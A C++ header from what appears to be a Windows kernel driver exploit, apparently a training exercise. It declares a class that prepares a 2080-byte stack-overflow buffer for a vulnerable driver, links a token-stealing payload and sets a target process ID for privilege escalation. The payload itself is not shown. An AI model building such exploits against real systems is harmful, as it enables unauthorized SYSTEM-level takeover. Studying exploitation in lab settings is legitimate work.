#ifndef __PAYLOAD_STACK_OVERFLOW_H__
#define __PAYLOAD_STACK_OVERFLOW_H__

#include <windows.h>

#include "payloads.h" // TokenStealingPayloadWin10

#include "iostream" // std::cout

using namespace std;

namespace payload_stack_overflow {

	/* prepare input buffer to send to vulnerable driver via CTL CODE */
	class PayloadStackOverFlow {

	public:
		byte* _buffer; // input buffer with payload
		const DWORD _bufferSz = 2080; // // input buffer size

		PayloadStackOverFlow(DWORD pid) {
			_buffer = 0;
			_targetPid = pid;
		}

		~PayloadStackOverFlow() {
			clear();
			_buffer = 0;
			_targetPid = 0;
		}
		
		/* allocate a buffer, link the payload and set the PID */
		bool init();

	private:
		DWORD _targetPid; // process 'PID' which is needed to escalate privileges

		/* deallocate a buffer */
		void clear();
		
	};

}


#endif // ifndef __PAYLOAD_STACK_OVERFLOW_H__